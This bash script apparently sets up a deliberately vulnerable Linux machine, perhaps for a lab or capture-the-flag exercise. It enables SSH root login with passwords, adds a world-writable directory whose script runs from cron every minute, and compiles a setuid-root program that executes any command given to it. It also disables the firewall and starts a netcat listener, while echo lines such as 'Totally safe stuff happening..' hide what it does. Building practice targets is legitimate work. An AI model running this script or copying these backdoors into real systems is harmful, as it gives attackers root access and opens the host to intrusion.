#!/bin/bash

file="$1"
param[1]="PermitRootLogin "
param[2]="PasswordAuthentication "

install_ssh_server(){
  /usr/bin/sudo /usr/bin/apt update -y
  /usr/bin/sudo /usr/bin/apt install openssh-server -y
}

install_gcc(){
  /usr/bin/sudo /usr/bin/apt install gcc -y
}

backup_sshd_config(){
  if [ -f ${file} ]
  then
    /usr/bin/cp ${file} ${file}.1
  else
    /usr/bin/echo "File ${file} not found."
    exit 1
  fi
}

edit_sshd_config_unsecure(){
  for PARAM in ${param[@]}
  do
    /usr/bin/sed -i '/^'"${PARAM}"'/d' ${file} 
    /usr/bin/echo "Totally safe stuff happening.."
  done
  /usr/bin/echo "${param[1]} yes" >> ${file}
  # /usr/bin//usr/bin/echo "'${param[1]} yes' was added to ${file}."
  /usr/bin/echo "${param[2]} yes" >> ${file}
  # /usr/bin//usr/bin/echo "'${param[2]} yes' was added to ${file}."
}

reload_sshd(){
  /usr/bin/systemctl reload sshd.service
  /usr/bin/echo "Run '/usr/bin/systemctl reload sshd.service'...OK"
}

fun_perms_script(){
  /usr/bin/sudo /usr/bin/mkdir /opt/scripts
  /usr/bin/sudo /usr/bin/mv backup.sh /opt/scripts
  /usr/bin/sudo /usr/bin/chmod -R 777 /opt/scripts
  /usr/bin/echo "* * * * * /bin/bash /opt/scripts/backup.sh" > mycron
  /usr/bin/crontab mycron
  /usr/bin/rm mycron
}

ignore_these_perms(){
  echo "#include <stdlib.h>" > /opt/scripts/exec.c
  echo "#include <stdio.h>" >> /opt/scripts/exec.c
  echo "#include <unistd.h>" >> /opt/scripts/exec.c
  echo "#include <string.h>" >> /opt/scripts/exec.c
  echo "//credits: Scott Sutherland" >> /opt/scripts/exec.c
  echo " " >> /opt/scripts/exec.c
  echo "int main(int argc, char *argv[]){" >> /opt/scripts/exec.c
  echo " " >> /opt/scripts/exec.c
  echo " printf(\"%s,%d\\n\", \"USER ID: \",getuid());" >> /opt/scripts/exec.c
  echo " printf(\"%s,%d\\n\", \"EXEC ID: \",geteuid());" >> /opt/scripts/exec.c
  echo " " >> /opt/scripts/exec.c
  echo " printf(\"Enter OS command:\");" >> /opt/scripts/exec.c
  echo " char line[100];" >> /opt/scripts/exec.c
  echo " fgets(line,sizeof(line),stdin);" >> /opt/scripts/exec.c
  echo " line[strlen(line) - 1] = '\0'; " >> /opt/scripts/exec.c
  echo " char * s = line;" >> /opt/scripts/exec.c
  echo " char * command[5];" >> /opt/scripts/exec.c
  echo " int i = 0;" >> /opt/scripts/exec.c
  echo " while(s){" >> /opt/scripts/exec.c
  echo " command[i] = strsep(&s,\" \");" >> /opt/scripts/exec.c
  echo " i++;" >> /opt/scripts/exec.c
  echo " }" >> /opt/scripts/exec.c
  echo " command[i] = NULL;" >> /opt/scripts/exec.c
  echo " execvp(command[0],command);" >> /opt/scripts/exec.c
  echo "}" >> /opt/scripts/exec.c

  /usr/bin/gcc -o /opt/scripts/exec /opt/scripts/exec.c
  /usr/bin/sudo /usr/bin/chown 0:0 /opt/scripts/exec
  /usr/bin/sudo /usr/bin/chmod 4755 /opt/scripts/exec
  /usr/bin/rm /opt/scripts/exec.c
}

firewall_and_shells_unsecure(){
  /usr/bin/sudo /usr/sbin/ufw disable
  /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")' &
  /usr/bin/nc -dnvlp 8080 1>/dev/null &
  disown
}

if [ -z "${file}" ]
then
file="/etc/ssh/sshd_config"
fi

install_ssh_server
install_gcc
fun_perms_script
ignore_these_perms
backup_sshd_config
edit_sshd_config_unsecure
firewall_and_shells_unsecure
reload_sshd

/usr/bin/clear
echo "Good luck! Script has finished!"